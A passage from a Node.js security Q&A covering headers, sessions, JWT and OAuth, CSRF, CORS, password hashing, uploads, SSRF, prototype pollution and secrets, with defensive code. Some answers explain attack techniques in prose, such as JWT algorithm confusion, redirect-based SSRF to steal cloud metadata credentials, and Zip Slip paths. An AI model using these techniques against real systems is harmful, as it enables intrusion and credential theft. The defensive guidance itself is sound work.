Add a `report-to` directive (with a `Reporting-Endpoints` header), or the older `report-uri`, and create an endpoint that accepts the report JSON. Reports can be sent with `application/csp-report` or `application/reports+json` content types, so parse those.

```js
res.setHeader("Reporting-Endpoints", 'csp="https://example.com/csp-reports"');
// CSP: ...; report-to csp

app.post(
  "/csp-reports",
  express.json({
    type: ["application/csp-report", "application/reports+json"],
    limit: "10kb",
  }),
  (req, res) => {
    logger.warn({ report: req.body }, "csp violation");
    res.sendStatus(204);
  },
);
```

Rate limit this endpoint, since anyone can send fake reports.

## 166: Which headers does Helmet set by default?

Helmet 8 sets, among others:

- `Content-Security-Policy` with a fairly strict default policy
- `Cross-Origin-Opener-Policy: same-origin`
- `Cross-Origin-Resource-Policy: same-origin`
- `Origin-Agent-Cluster: ?1`
- `Referrer-Policy: no-referrer`
- `Strict-Transport-Security: max-age=31536000; includeSubDomains`
- `X-Content-Type-Options: nosniff`
- `X-DNS-Prefetch-Control: off`
- `X-Frame-Options: SAMEORIGIN`
- `X-XSS-Protection: 0`

It also removes `X-Powered-By`. Each one can be turned off or configured.

## 167: Why does Helmet set X-XSS-Protection to 0?

The old browser XSS filter that this header controlled was removed from modern browsers, and in some cases it actually created new holes (attackers could use it to disable legit scripts or leak data). Setting it to `0` turns the filter off in any old browser that still has it. Use CSP instead.

## 168: What is HSTS preload and what should you check before enabling it?

The preload list is built into browsers, so they use HTTPS for your domain even on the very first visit. You add `preload` to the header and submit the domain at hstspreload.org.

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

Before that, make sure every subdomain supports HTTPS, because removal from the list is slow and broken subdomains become unreachable.

## 169: What are the __Host- and __Secure- cookie prefixes?

They are name prefixes that browsers enforce:

- `__Secure-` cookies must have the `Secure` flag.
- `__Host-` cookies must be `Secure`, have `Path=/` and no `Domain` attribute, so they are locked to the exact host.

`__Host-` stops a compromised or malicious subdomain from setting or overwriting your session cookie.

```js
res.cookie("__Host-sid", id, {
  httpOnly: true,
  secure: true,
  sameSite: "lax",
  path: "/",
});
```

## 170: How do you configure express-session for production?

```js
import session from "express-session";
import { RedisStore } from "connect-redis";
import { createClient } from "redis";

const redisClient = createClient({ url: process.env.REDIS_URL });
await redisClient.connect();

app.set("trust proxy", 1);
app.use(
  session({
    store: new RedisStore({ client: redisClient }),
    name: "__Host-sid",
    secret: process.env.SESSION_SECRET.split(","), // allows rotation
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: true,
      sameSite: "lax",
      maxAge: 8 * 60 * 60 * 1000,
    },
  }),
);
```

The default `MemoryStore` leaks memory and is not meant for production.

## 171: How do you prevent session fixation in Express?

Call `req.session.regenerate()` right after a successful login. It creates a new session ID and drops the old one, so an ID the attacker planted before login is useless.

```js
app.post("/login", async (req, res, next) => {
  const user = await checkCredentials(req.body);
  if (!user) return res.status(401).json({ error: "Invalid credentials" });

  req.session.regenerate((err) => {
    if (err) return next(err);
    req.session.userId = user.id;
    req.session.save((err) => (err ? next(err) : res.sendStatus(204)));
  });
});
```

Do the same when the user's privilege level changes, for example after step-up MFA.

## 172: What is the difference between idle timeout and absolute timeout for sessions?

Idle timeout ends the session after a period with no activity (for example 30 minutes). Absolute timeout ends it after a fixed time no matter what (for example 12 hours). Use both: idle timeout protects unattended devices, absolute timeout limits how long a stolen session can be used. In `express-session`, `rolling: true` gives you idle-style expiry; store the login time to enforce the absolute limit.

## 173: Where should a browser app store JWTs: localStorage or cookies?

`localStorage` can be read by any script on the page, so one XSS bug leaks the token. An `HttpOnly`, `Secure`, `SameSite` cookie cannot be read by scripts, though you then need CSRF protection. For browser apps, many teams use the backend-for-frontend pattern: tokens stay on the server and the browser gets only a session cookie.

## 174: What is the "alg: none" JWT attack and how do you prevent it?

Some old libraries trusted the `alg` field in the token header. An attacker could set `alg` to `none`, remove the signature and the library would accept it. A related attack switches RS256 to HS256 and signs with the public key as an HMAC secret. Always pass an explicit list of allowed algorithms when verifying:

```js
await jwtVerify(token, publicKey, { algorithms: ["RS256"] });
// jsonwebtoken: jwt.verify(token, publicKey, { algorithms: ['RS256'] })
```

## 175: Which claims should you check when verifying a JWT?

- Signature with the expected algorithm and key.
- `exp` (not expired) and `nbf` (not before), with a small clock skew allowance.
- `iss` (issued by the server you trust).
- `aud` (meant for your API, not some other service).
- `sub` (whose token it is).

```js
const { payload } = await jwtVerify(token, jwks, {
  algorithms: ["RS256"],
  issuer: "https://auth.example.com/",
  audience: "orders-api",
  clockTolerance: 30,
});
```

## 176: How can you revoke JWTs before they expire?

JWTs are valid until `exp` by design, so you need extra steps:

- Keep access tokens short (5 to 15 minutes) and revoke the refresh token on the server.
- Keep a deny list of revoked token IDs (`jti`) in Redis until they expire.
- Store a per-user "token version" or "valid after" timestamp and reject older tokens.

All of these add a server-side lookup, which is the trade-off for being able to log someone out right away.

## 177: What is refresh token rotation?

Each time a refresh token is used, the server issues a new refresh token and marks the old one as used. If an old refresh token shows up again, it means someone copied it, so the server revokes the whole token family and forces a new login. This limits how long a stolen refresh token stays useful.

## 178: What is PKCE and why is it required now?

Proof Key for Code Exchange protects the OAuth authorization code flow. The client creates a random `code_verifier`, sends a hash of it (`code_challenge`) with the auth request, and must send the original verifier when exchanging the code for tokens. A stolen authorization code is useless without the verifier. OAuth 2.1 and current best practice require PKCE for all clients, including server-side ones.

## 179: How do you implement an OIDC login with openid-client in Node.js?

```js
import * as client from "openid-client";

const config = await client.discovery(
  new URL("https://accounts.example.com"),
  process.env.OIDC_CLIENT_ID,
  process.env.OIDC_CLIENT_SECRET,
);

app.get("/login", (req, res) => {
  const codeVerifier = client.randomPKCECodeVerifier();
  const state = client.randomState();
  req.session.oidc = { codeVerifier, state };

  client.calculatePKCECodeChallenge(codeVerifier).then((codeChallenge) => {
    const url = client.buildAuthorizationUrl(config, {
      redirect_uri: "https://app.example.com/callback",
      scope: "openid email profile",
      code_challenge: codeChallenge,
      code_challenge_method: "S256",
      state,
    });
    res.redirect(url.href);
  });
});

app.get("/callback", async (req, res) => {
  const { codeVerifier, state } = req.session.oidc;
  const currentUrl = new URL(req.originalUrl, "https://app.example.com");
  const tokens = await client.authorizationCodeGrant(config, currentUrl, {
    pkceCodeVerifier: codeVerifier,
    expectedState: state,
  });
  const claims = tokens.claims(); // validated ID token claims
  req.session.regenerate(() => {
    req.session.userId = claims.sub;
    res.redirect("/");
  });
});
```

## 180: What are the state and nonce parameters in OAuth and OIDC for?

`state` is a random value the client sends with the authorization request and checks when the user comes back. It stops CSRF on the callback, where an attacker could make you log in with their account. `nonce` is put into the ID token by the provider, and checking it stops an old ID token from being replayed.

## 181: What is the backend-for-frontend (BFF) pattern for auth?

A small server-side component (often part of your Node.js app) handles the OAuth flow, keeps the access and refresh tokens on the server, and gives the browser only an `HttpOnly` session cookie. The browser calls the BFF, which adds the access token when calling APIs. Tokens never touch JavaScript in the browser, so XSS cannot steal them directly.

## 182: Why is the csurf package no longer recommended?

`csurf` was deprecated in 2022 and is no longer maintained. Use a maintained alternative such as `csrf-csrf` (double-submit cookie pattern) or `csrf-sync` (synchronizer token pattern), or rely on `SameSite` cookies plus `Origin`/`Sec-Fetch-Site` checks if your app's design allows it.

## 183: What is the double-submit cookie pattern for CSRF?

The server sets a random CSRF token in a cookie and the client must also send the same token in a header or form field. An attacker on another site can make the browser send the cookie, but cannot read it to put it in the header. The safer version signs the token with a server secret and ties it to the session, so an attacker who can set cookies from a subdomain cannot plant a matching pair.

## 184: How do you use Fetch Metadata headers to block cross-site requests?

Modern browsers send `Sec-Fetch-Site` with every request: `same-origin`, `same-site`, `cross-site` or `none` (typed in the address bar). You can reject cross-site state-changing requests in middleware:

```js
const SAFE_METHODS = new Set(["GET", "HEAD", "OPTIONS"]);

app.use((req, res, next) => {
  const site = req.get("sec-fetch-site");
  if (
    !SAFE_METHODS.has(req.method) &&
    site &&
    site !== "same-origin" &&
    site !== "none"
  ) {
    return res.status(403).json({ error: "Cross-site request blocked" });
  }
  next();
});
```

Fall back to checking `Origin` for old browsers that do not send the header.

## 185: How do you configure CORS with a dynamic list of origins?

```js
import cors from "cors";

const allowed = new Set(process.env.CORS_ORIGINS.split(","));

app.use(
  cors({
    origin(origin, callback) {
      if (!origin) return callback(null, false); // no Origin header: no CORS headers
      callback(null, allowed.has(origin));
    },
    credentials: true,
  }),
);
```

Match the full origin exactly. Do not use `origin.endsWith('example.com')`, which also matches `evilexample.com`.

## 186: What is a CORS preflight request?

For requests that are not "simple" (for example with `Content-Type: application/json`, a custom header or methods like PUT and DELETE), the browser first sends an `OPTIONS` request asking if the real request is allowed. The server answers with `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers` and optionally `Access-Control-Max-Age` to cache the answer. Only then does the browser send the real request.

## 187: Why should you never allow the "null" origin in CORS?

Browsers send `Origin: null` from sandboxed iframes, `file://` pages and some redirects. An attacker can easily create a sandboxed iframe on their site, so allowing `null` is like allowing every site. Leave it out of your allowlist.

## 188: Why is reflecting the request Origin with credentials dangerous?

Some setups copy any incoming `Origin` into `Access-Control-Allow-Origin` and also set `Access-Control-Allow-Credentials: true`. That lets any website make authenticated requests with the user's cookies and read the responses, which is basically a full data leak. In the `cors` package, `origin: true` does exactly this reflection, so avoid it with `credentials: true`.

## 189: How should rate limiting on a login endpoint work?

Use more than one key:

- Per IP, to slow down one machine trying many accounts.
- Per account (username or email), to stop many IPs trying one account.
- Possibly per IP and account together, with a lower limit.

Count only failed attempts where possible, so normal users are not punished, and return the same generic error message.

## 190: How do you share rate limit counters across several Node.js instances?

Use a shared store, usually Redis. With `express-rate-limit`, plug in `rate-limit-redis`:

```js
import { rateLimit } from "express-rate-limit";
import { RedisStore } from "rate-limit-redis";

const limiter = rateLimit({
  windowMs: 60_000,
  limit: 20,
  store: new RedisStore({
    sendCommand: (...args) => redisClient.sendCommand(args),
  }),
});
```

Without this, each instance has its own counter and the real limit becomes "limit times number of instances."

## 191: What is the difference between rate limiting and slowing down requests?

Rate limiting rejects requests over the limit with 429. Slowing down (for example with `express-slow-down`) adds an increasing delay to each request after a threshold, but still answers. Slowing down hurts automated attacks while being friendlier to real users who make a few extra requests.

## 192: What are the risks of account lockout as a brute-force defense?

If you lock an account after five failed logins, an attacker can lock out any user on purpose just by sending wrong passwords, which is its own denial of service. Safer options are temporary lockouts that grow over time, CAPTCHA after failures, notifying the user and requiring MFA. Combine them with IP-based limits.

## 193: What settings should you use for Argon2id in Node.js?

OWASP gives several equal options, for example memory 19 MiB with 2 iterations and parallelism 1, or 46 MiB with 1 iteration. Tune it so one hash takes a few hundred milliseconds on your servers without using too much memory under load.

```js
import argon2 from "argon2";

const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 19456, // KiB
  timeCost: 2,
  parallelism: 1,
});
```

## 194: What is bcrypt's 72-byte limit and why does it matter?

bcrypt uses only the first 72 bytes of the password and ignores the rest. Two long passwords with the same first 72 bytes hash to the same value. With multi-byte UTF-8 characters, that can be fewer than 72 characters. Either set a reasonable maximum password length, or prefer Argon2id, which has no such limit. Avoid pre-hashing tricks unless you know the pitfalls (like null bytes in raw digests).

## 195: How do you upgrade password hashes when you change the algorithm or cost?

You cannot rehash without the password, so do it at login. After a successful check, see if the stored hash uses old settings, and if so, hash the password again with the new settings and save it.

```js
const ok = await argon2.verify(user.hash, password);
if (ok && argon2.needsRehash(user.hash, CURRENT_OPTIONS)) {
  user.hash = await argon2.hash(password, CURRENT_OPTIONS);
  await user.save();
}
```

For bcrypt, read the cost from the hash with `bcrypt.getRounds(hash)`.

## 196: What is a pepper in password hashing?

A pepper is a secret value added to all passwords (or used as an HMAC key) before hashing, and stored outside the database, for example in a secrets manager or HSM. If only the database leaks, attackers cannot crack hashes without the pepper. The downside is that rotating it is hard, so plan for versioning.

## 197: How do you hash a password with scrypt from node:crypto?

```js
import { scrypt, randomBytes, timingSafeEqual } from "node:crypto";
import { promisify } from "node:util";

const scryptAsync = promisify(scrypt);
const PARAMS = { N: 2 ** 17, r: 8, p: 1, maxmem: 256 * 1024 * 1024 };

export async function hashPassword(password) {
  const salt = randomBytes(16);
  const key = await scryptAsync(password, salt, 64, PARAMS);
  return `scrypt$${salt.toString("base64")}$${key.toString("base64")}`;
}

export async function verifyPassword(password, stored) {
  const [, saltB64, keyB64] = stored.split("$");
  const expected = Buffer.from(keyB64, "base64");
  const actual = await scryptAsync(
    password,
    Buffer.from(saltB64, "base64"),
    expected.length,
    PARAMS,
  );
  return timingSafeEqual(actual, expected);
}
```

`maxmem` must be raised for N = 2^17, or Node.js throws a memory limit error.

## 198: How do you write an RBAC middleware in Express?

```js
const PERMISSIONS = {
  admin: ["user:read", "user:write", "order:read", "order:write"],
  support: ["user:read", "order:read"],
  customer: ["order:read"],
};

const requirePermission = (permission) => (req, res, next) => {
  if (!req.user) return res.sendStatus(401);
  const allowed = PERMISSIONS[req.user.role] ?? [];
  if (!allowed.includes(permission)) return res.sendStatus(403);
  next();
};

app.delete("/users/:id", requirePermission("user:write"), deleteUser);
```

Check permissions, not role names, in routes. Then adding a new role does not mean editing every route.

## 199: Why is checking the role not enough for many endpoints?

A role check says "customers can read orders," but not "which orders." Without an ownership check, a customer can read every customer's orders by changing the ID. Combine the permission check with a query that limits rows to what the user owns or is allowed to see.

```js
const order = await db.order.findFirst({
  where: { id: req.params.id, customerId: req.user.id },
});
if (!order) return res.sendStatus(404);
```

## 200: What is CASL and when would you use it?

CASL is a JavaScript authorization library where you define abilities like "user can update Article where authorId equals their ID." You can check them in code (`ability.can('update', article)`) and also turn them into database filters (for example with `@casl/prisma` or `@casl/mongoose`). It is useful when you have a mix of roles and ownership rules and want them in one place, shared between back end and front end.

## 201: How do you configure multer safely for file uploads?

```js
import multer from "multer";
import crypto from "node:crypto";
import path from "node:path";

const ALLOWED = new Map([
  ["image/png", ".png"],
  ["image/jpeg", ".jpg"],
]);

const upload = multer({
  storage: multer.diskStorage({
    destination: "/var/app/uploads", // outside the web root
    filename: (req, file, cb) =>
      cb(null, crypto.randomUUID() + ALLOWED.get(file.mimetype)),
  }),
  limits: { fileSize: 5 * 1024 * 1024, files: 1, fields: 10 },
  fileFilter: (req, file, cb) => cb(null, ALLOWED.has(file.mimetype)),
});

app.post("/avatar", upload.single("avatar"), handleAvatar);
```

`file.mimetype` comes from the client, so it is only a first filter. Check the real content after upload too.

## 202: How do you check the real type of an uploaded file?

Look at the first bytes of the file (the "magic bytes"), for example with the `file-type` package, and compare with your allowlist.

```js
import { fileTypeFromFile } from "file-type";
import { unlink } from "node:fs/promises";

const type = await fileTypeFromFile(req.file.path);
if (!type || !["image/png", "image/jpeg"].includes(type.mime)) {
  await unlink(req.file.path);
  return res.status(400).json({ error: "Unsupported file type" });
}
```

For images, re-encoding them (for example with `sharp`) also strips hidden payloads and metadata.

## 203: How do you safely build a file path from user input?

Resolve the full path and make sure it is still inside your base folder.

```js
import path from "node:path";

const BASE = path.resolve("/var/app/files");

function safePath(userName) {
  const full = path.resolve(BASE, userName);
  if (full !== BASE && !full.startsWith(BASE + path.sep)) {
    throw new Error("Path traversal attempt");
  }
  return full;
}
```

Checking `startsWith(BASE + path.sep)` matters: a plain `startsWith(BASE)` would allow `/var/app/files-secret`. Better still, store files under generated IDs and never use user input as a path.

## 204: Why might a path check still fail because of symlinks?

`path.resolve` works on the string only. If the folder contains a symlink pointing outside, the resolved string looks fine but the real file is elsewhere. Use `fs.realpath` on the final path and check that result against the real base path, or make sure users can never create symlinks in that folder.

## 205: How do you serve user-uploaded files safely for download?

- Look up the file by ID in your database, check that the user may access it, then stream it.
- Set `Content-Disposition: attachment` so the browser downloads it instead of showing it.
- Set the correct `Content-Type` and `X-Content-Type-Options: nosniff`.
- Serve from a separate domain if users must view files inline, so any script in them cannot reach your main site's cookies.

```js
res.download(filePath, "report.pdf"); // sets Content-Disposition: attachment
```

## 206: What is Zip Slip?

When extracting an archive, entry names like `../../app/server.js` can write files outside the target folder and overwrite code or config. Use a maintained extraction library and check each entry path with the same "resolve and stay inside base" check before writing. Also limit the total extracted size and file count to avoid zip bombs.

## 207: What is a decompression bomb and how do you defend against it?

A small compressed file (zip, gzip, PNG) that expands to gigabytes when decompressed, using up memory or disk. Defend by limiting the output size while decompressing, not just the input size. For images, `sharp` has `limitInputPixels` (on by default) to reject huge dimensions. For gzip request bodies, body parsers check the size after inflating.

## 208: How do you check a user-supplied URL before fetching it, to prevent SSRF?

- Parse it with `new URL()` and allow only `https:` (and maybe `http:`).
- Allow only specific hosts if the feature allows it.
- Resolve the hostname and reject private, loopback, link-local and other internal IP ranges.
- Do not follow redirects automatically, or check each redirect target the same way.
- Use timeouts and response size limits.

## 209: How do you block private IP ranges with net.BlockList?

```js
import net from "node:net";
import dns from "node:dns/promises";

const blocked = new net.BlockList();
blocked.addSubnet("10.0.0.0", 8);
blocked.addSubnet("172.16.0.0", 12);
blocked.addSubnet("192.168.0.0", 16);
blocked.addSubnet("127.0.0.0", 8);
blocked.addSubnet("169.254.0.0", 16);
blocked.addSubnet("0.0.0.0", 8);
blocked.addSubnet("100.64.0.0", 10);
blocked.addSubnet("::1", 128, "ipv6");
blocked.addSubnet("fc00::", 7, "ipv6");
blocked.addSubnet("fe80::", 10, "ipv6");

async function assertPublicHost(hostname) {
  const addresses = await dns.lookup(hostname, { all: true });
  for (const { address, family } of addresses) {
    if (blocked.check(address, family === 6 ? "ipv6" : "ipv4")) {
      throw new Error("Blocked address");
    }
  }
}
```

This alone has a DNS rebinding gap, because the HTTP client resolves the name again. Advanced setups check the IP at connection time instead.

## 210: Why are HTTP redirects a problem for SSRF protection?

You might check that `https://good.example.com/image` is public, but that server can reply with a redirect to `http://169.254.169.254/`. If your HTTP client follows redirects automatically, the check is bypassed. Use `redirect: 'manual'` with `fetch` and validate each `Location` yourself, with a small maximum number of hops.

```js
const res = await fetch(url, {
  redirect: "manual",
  signal: AbortSignal.timeout(5000),
});
```

## 211: Why are cloud metadata endpoints a key SSRF target?

On AWS, GCP and Azure, `169.254.169.254` (and similar) returns instance info and, in many setups, temporary cloud credentials. An SSRF bug that reaches it can give the attacker your server's IAM role. On AWS, require IMDSv2, which needs a PUT request with a token first and blocks most simple SSRF. Also give the instance role only the permissions it needs.

## 212: How do you prevent prototype pollution in your own code?

- Use `Map` for key-value data from users instead of plain objects.
- Create dictionary objects with `Object.create(null)`, which have no prototype.
- In merge or "set by path" code, skip the keys `__proto__`, `constructor` and `prototype`.
- Validate input with a strict schema that rejects unknown keys.
- Use `Object.hasOwn(obj, key)` instead of `obj[key]` or `in` when checking options.

```js
const FORBIDDEN = new Set(["__proto__", "constructor", "prototype"]);
for (const key of Object.keys(source)) {
  if (FORBIDDEN.has(key)) continue;
  // ...
}
```

## 213: What does the --disable-proto flag do?

It changes how `Object.prototype.__proto__` works for the whole process. `--disable-proto=delete` removes the `__proto__` accessor, and `--disable-proto=throw` makes any access to it throw. It shuts one common pollution path, but `constructor.prototype` paths still work, so it is a hardening layer, not a full fix.

```bash
node --disable-proto=delete server.js
```

## 214: Does JSON.parse pollute the prototype when the input has a proto key?

No. `JSON.parse('{"__proto__": {"x": 1}}')` creates an own property named `__proto__`; it does not change the prototype. The danger comes later, when code copies that object's keys into another object with normal assignment (`target[key] = value`), which does trigger the `__proto__` setter. That is why unsafe merge functions are the usual cause.

## 215: Why can freezing Object.prototype help, and what is the downside?

`Object.freeze(Object.prototype)` makes it impossible to add or change properties on it, so pollution attempts fail (silently, or with an error in strict mode). The downside is that some older libraries patch built-in prototypes and will break. Test well, and freeze early in startup, after loading the libraries that need it.

## 216: How do you find ReDoS problems in your regexes?

- Lint with `eslint-plugin-regexp` or `eslint-plugin-security`, which flag risky patterns.
- Use checkers like `recheck` or `safe-regex2` in tests or CI.
- Look for nested quantifiers (`(a+)+`), alternation with overlap (`(a|ab)*`) and repeated groups next to other greedy parts.
- Fuzz the function with long, almost-matching strings and measure time.

## 217: How does the re2 package protect against ReDoS?

`re2` wraps Google's RE2 engine, which runs in linear time and does not backtrack. Catastrophic patterns simply cannot blow up. The trade-off is that it does not support lookarounds or backreferences, and it is a native addon.

```js
import RE2 from "re2";
const emailLike = new RE2("^[^@\\s]+@[^@\\s]+$");
emailLike.test(input);
```

## 218: Why should you limit input length before running a regex?

Even a slow regex is harmless on a 50-character string. Many ReDoS attacks need long inputs, so a simple length check first (and a body size limit at the parser) cuts the risk a lot. Validation libraries let you put `.max()` before `.regex()`, so the length check runs first.

## 219: How do you measure event loop blocking in production?

Use `monitorEventLoopDelay` from `node:perf_hooks`, or `performance.eventLoopUtilization()`, and export the numbers to your metrics system.

```js
import { monitorEventLoopDelay } from "node:perf_hooks";

const h = monitorEventLoopDelay({ resolution: 20 });
h.enable();

setInterval(() => {
  metrics.gauge("event_loop_p99_ms", h.percentile(99) / 1e6);
  h.reset();
}, 10_000);
```

A rising p99 delay is often the first sign of a DoS or a slow code path.

## 220: How do you keep CPU-heavy work from blocking the event loop?

- Move it to a worker thread (`node:worker_threads`) or a pool like `piscina`.
- Use async versions of crypto and zlib functions, which run on the libuv thread pool.
- Process big jobs in a background queue (BullMQ, SQS) instead of inside the request.
- Split long loops into chunks with `setImmediate` if you must keep them on the main thread.

## 221: What is load shedding and how do you do it in Node.js?

Load shedding means rejecting some requests (with 503) when the server is overloaded, so it can still serve the rest instead of everyone timing out. In Fastify, `@fastify/under-pressure` checks event loop delay, heap and RSS and returns 503 when limits are passed. In Express you can write a small middleware that checks `monitorEventLoopDelay` values.

## 222: Why can JSON.parse be a DoS vector?

`JSON.parse` is synchronous. Parsing a body of several megabytes, especially with deep nesting or many small keys, can block the event loop for a noticeable time, and the parsed object can use much more memory than the raw text. Keep body size limits small, and stream-parse large uploads instead of buffering them.

## 223: How do you parse YAML from users safely in Node.js?

Use `js-yaml` version 4 or later, where `load()` uses a safe schema by default and does not create functions or other JavaScript types. In version 3, `load()` was unsafe and you had to use `safeLoad()`. The `yaml` package is also safe by default. Still validate the result with a schema, and watch out for "billion laughs" style alias expansion, which you can limit with parser options.

## 224: Why should you not use v8.deserialize on untrusted data?

`v8.deserialize` reads V8's internal serialization format. It is meant for trusted data passed between your own processes. Crafted input can cause crashes, huge memory use or unexpected objects. For data from outside, use JSON with schema validation, or a format with a strict schema like Protocol Buffers.

## 225: How can you replace eval in common use cases?

- Parsing data: use `JSON.parse`.
- Calling a function by name: use an object map, like `handlers[name]`, with a check that the name is allowed.
- Evaluating math: use a safe expression parser that supports only arithmetic.
- Dynamic property access: use `obj[key]` with `Object.hasOwn`.

```js
const actions = { start, stop, restart };
const fn = Object.hasOwn(actions, req.body.action)
  ? actions[req.body.action]
  : null;
if (!fn) return res.sendStatus(400);
await fn();
```

## 226: What does --disallow-code-generation-from-strings do?

It makes `eval()`, `new Function()` and similar calls throw an `EvalError` for the whole process. If your code and dependencies do not need them, it removes a whole class of code injection bugs. Some template engines and libraries do use `new Function`, so test before turning it on.

```bash
node --disallow-code-generation-from-strings server.js
```

## 227: How should you run untrusted user code in a Node.js service?

Not in your main process and not with `node:vm`. Run it in a separate, isolated environment: a short-lived container or microVM (Firecracker, gVisor) with no network, tight CPU and memory limits, a time limit and a read-only file system. For smaller cases, `isolated-vm` runs code in a separate V8 isolate with memory limits, but it should still be combined with OS-level isolation for strong safety. `vm2` is discontinued and has known escapes.

## 228: How do you load secrets from a secrets manager at startup?

Fetch them once before the server starts listening, keep them in memory and fail fast if they are missing.

```js
import {
  SecretsManagerClient,
  GetSecretValueCommand,
} from "@aws-sdk/client-secrets-manager";

const client = new SecretsManagerClient({});
const { SecretString } = await client.send(
  new GetSecretValueCommand({ SecretId: "prod/orders-api" }),
);
const secrets = JSON.parse(SecretString);

const app = createApp({ dbUrl: secrets.DATABASE_URL });
app.listen(3000);
```

The app gets access through its IAM role, so there is no long-lived key in the environment.

## 229: What are the downsides of keeping secrets in environment variables?

- Every child process inherits them by default.
- They can show up in crash reports, error trackers, debug pages and `ps`/`/proc` output on the same host.
- Logging `process.env` by mistake leaks everything.
- They are hard to rotate without restarting.

Environment variables are still common and fine for many apps, but mounted secret files or fetching from a secrets manager limit the exposure.

## 230: How do you stop secrets from being committed in the first place?

- Turn on GitHub secret scanning with push protection, which blocks pushes that contain known key formats.
- Add a pre-commit hook with `gitleaks` or `trufflehog`.
- Keep `.env*` in `.gitignore` with only `.env.example` committed.
- Run the same scanner in CI to catch anything that slipped past local hooks.

## 231: How do you rotate a secret without downtime?

Support two valid values at once during the switch. For example, `express-session` accepts an array of secrets: it signs with the first and accepts all of them. For JWTs, publish both the old and new public keys in your JWKS with different `kid` values. Roll out the new secret, wait until old tokens or cookies expire, then remove the old one.

## 232: How do you encrypt data with AES-256-GCM in Node.js?

```js
import { randomBytes, createCipheriv, createDecipheriv } from "node:crypto";

const key = Buffer.from(process.env.DATA_KEY, "base64"); // 32 bytes

export function encrypt(plaintext) {
  const iv = randomBytes(12);
  const cipher = createCipheriv("aes-256-gcm", key, iv);
  const data = Buffer.concat([
    cipher.update(plaintext, "utf8"),
    cipher.final(),
  ]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, data]).toString("base64");
}

export function decrypt(encoded) {
  const buf = Buffer.from(encoded, "base64");
  const iv = buf.subarray(0, 12);
  const tag = buf.subarray(12, 28);
  const data = buf.subarray(28);
  const decipher = createDecipheriv("aes-256-gcm", key, iv);
  decipher.setAuthTag(tag);
  return Buffer.concat([decipher.update(data), decipher.final()]).toString(
    "utf8",
  );
}
```

GCM gives both secrecy and integrity: `final()` throws if the data or tag was changed.

## 233: Why must you never reuse an IV with the same key in AES-GCM?

GCM is broken badly by IV reuse: an attacker who sees two messages with the same key and IV can XOR them to learn about both plaintexts and can even forge new authenticated messages. Use a fresh random 12-byte IV for every encryption, and rotate the key long before you get near the safe limit of messages per key.

## 234: What is the difference between createCipher and createCipheriv?

`crypto.createCipher` derived the key and IV from a password in an insecure way (a single MD5 round, no salt, fixed IV). It was deprecated for years and removed in Node.js 22. Use `createCipheriv` with a real random key and a fresh IV, and derive keys from passwords with scrypt or PBKDF2 if you must.

## 235: What is HKDF and when would you use it?

HKDF (HMAC-based key derivation function) turns one strong secret into several separate keys for different purposes. For example, from one master key you can derive one key for encrypting cookies and another for signing tokens. It is not for passwords; use it only with secrets that are already random and long.

```js
import { hkdfSync } from "node:crypto";

const cookieKey = Buffer.from(
  hkdfSync("sha256", masterKey, salt, "cookie-encryption", 32),
);
```

## 236: What is crypto.hash and when should you use it?

`crypto.hash(algorithm, data, outputEncoding)` is a one-shot helper added in recent Node.js versions. It is faster and shorter than `createHash().update().digest()` for small inputs that are already in memory.

```js
import { hash } from "node:crypto";
const etag = hash("sha256", body, "hex");
```

Use it for checksums, cache keys and API key lookups, never for passwords.

## 237: How do you generate a secure random number in a range?

Use `crypto.randomInt`, which avoids the bias you get from `randomBytes(...) % n`.

```js
import { randomInt } from "node:crypto";

const otp = String(randomInt(0, 1_000_000)).padStart(6, "0");
```

## 238: How do you sign and verify data with Ed25519 in Node.js?

```js
import { generateKeyPairSync, sign, verify } from "node:crypto";

const { publicKey, privateKey } = generateKeyPairSync("ed25519");
const message = Buffer.from("order:1234:paid");

const signature = sign(null, message, privateKey);
const ok = verify(null, message, publicKey, signature);
```

For Ed25519, the algorithm argument is `null` because the hash is built in. Signatures are small and fast, and only the holder of the private key can create them.

## 239: What is the Web Crypto API in Node.js and why use it?

Node.js exposes the standard browser crypto API as `globalThis.crypto` (with `crypto.subtle`). Code written against it runs the same in Node.js, Deno, Bun, Cloudflare Workers and browsers. It is fully async. Libraries like `jose` use it so they work across runtimes.

```js
const key = await crypto.subtle.generateKey(
  { name: "AES-GCM", length: 256 },
  true,
  ["encrypt", "decrypt"],
);
const iv = crypto.getRandomValues(new Uint8Array(12));
const encrypted = await crypto.subtle.encrypt(
  { name: "AES-GCM", iv },
  key,
  new TextEncoder().encode("hi"),
);
```

## 240: How do you start an HTTPS server in Node.js with modern TLS settings?

```js
import https from "node:https";
import { readFileSync } from "node:fs";

const server = https.createServer(
  {
    key: readFileSync("/etc/tls/server.key"),
    cert: readFileSync("/etc/tls/server.crt"),
    minVersion: "TLSv1.2",
  },
  app,
);

server.listen(443);
```

Node's default minimum is already TLS 1.2 and its default cipher list is reasonable, so you usually only need to raise `minVersion` to `TLSv1.3` if all clients support it.

## 241: How do you trust a private or corporate CA in Node.js?

Node.js ships its own bundle of Mozilla CA certificates and does not use the OS store by default. Options:

- `NODE_EXTRA_CA_CERTS=/path/ca.pem` adds certs to the bundle.
- `--use-system-ca` uses the operating system's trust store.
- Pass `ca` in the TLS options for one specific connection.

All of these are far better than turning off verification.

## 242: What is mutual TLS and when would you use it between services?

In mTLS, both sides present certificates. The server checks the client's certificate against a trusted CA, so only known services can connect. It is common for service-to-service traffic, often handled by a service mesh (Istio, Linkerd). In Node.js, set `requestCert: true` and `rejectUnauthorized: true` on the server, and pass `cert` and `key` on the client.

```js
https.createServer(
  { key, cert, ca: internalCa, requestCert: true, rejectUnauthorized: true },
  app,
);
```

## 243: How do you install dependencies without running install scripts?

```bash
npm ci --ignore-scripts
```

You can also set it in `.npmrc` with `ignore-scripts=true`. Some packages (for example ones with native addons like `bcrypt` or `sharp`) need their scripts to build, so you then run those explicitly with `npm rebuild <pkg>`. pnpm 10 goes further and does not run dependency install scripts unless the package is listed in `onlyBuiltDependencies`.

## 244: What does npm audit signatures check?

It checks that the packages in your tree have valid registry signatures (proving they came from the npm registry unchanged) and, where available, valid provenance attestations linking them to a source repo and build. It does not say a package is safe, only that it is what the registry published.

```bash
npm audit signatures
```

## 245: How do you fix a vulnerable transitive dependency you do not control?

